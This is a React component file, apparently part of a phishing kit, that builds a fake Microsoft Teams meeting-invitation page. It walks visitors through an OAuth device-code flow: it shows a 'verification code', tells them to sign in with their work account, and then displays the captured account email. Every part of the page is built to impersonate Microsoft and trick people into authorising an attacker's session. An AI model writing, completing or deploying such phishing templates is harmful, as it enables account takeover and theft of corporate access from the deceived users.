import React from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function CalendarInviteTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow();
  const now = new Date();
  const meetingDate = new Date(now.getTime() + 86400000);
  const dateStr = meetingDate.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric', year: 'numeric' });

  return (
    <div className="tpl-page" style={{ background: '#f3f2f1' }}>
      <div className="tpl-container" style={{ maxWidth: 560 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
          <svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#5B5FC7"/><rect x="6" y="8" width="20" height="18" rx="2" fill="white" opacity="0.9"/><rect x="6" y="6" width="20" height="6" rx="2" fill="white"/><line x1="11" y1="4" x2="11" y2="8" stroke="#5B5FC7" strokeWidth="2"/><line x1="21" y1="4" x2="21" y2="8" stroke="#5B5FC7" strokeWidth="2"/></svg>
          <span style={{ fontSize: 18, fontWeight: 600, color: '#1b1b1b' }}>Microsoft Teams</span>
        </div>

        <div className="tpl-card">
          {f.state === 'idle' && (
            <>
              <div style={{ borderLeft: '4px solid #5B5FC7', paddingLeft: 16, marginBottom: 20 }}>
                <h1 className="tpl-title" style={{ marginBottom: 4 }}>Meeting Invitation</h1>
                <p style={{ fontSize: 13, color: '#605e5c', margin: 0 }}>{dateStr} at 10:00 AM</p>
              </div>
              <p className="tpl-text">You have been invited to a Microsoft Teams meeting. Please verify your identity to accept the invitation and join.</p>
              <div className="tpl-info-box" style={{ background: '#f0eef9', borderColor: '#c5c2e8', color: '#5B5FC7' }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#5B5FC7" strokeWidth="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
                <span>3 participants already confirmed</span>
              </div>
              <button className="tpl-btn" style={{ background: '#5B5FC7' }} onClick={f.handleStart}>Accept & Verify</button>
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Preparing invitation...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Verify Your Identity</h1>
              <p className="tpl-text">Enter this code to confirm your identity and accept the meeting invitation.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">VERIFICATION CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps"><div className="tpl-step">1. Copy the verification code</div><div className="tpl-step">2. Click verify and sign in with your work account</div></div>
              <button className="tpl-btn" style={{ background: '#5B5FC7' }} onClick={f.handleVerify}>Verify</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Waiting for verification...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Invitation Accepted</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">You will receive a calendar invite shortly.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Accept another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#5B5FC7' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#5B5FC7' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
        <div className="tpl-footer"><span>Microsoft Terms</span><span>Privacy</span></div>
      </div>
    </div>
  );
}
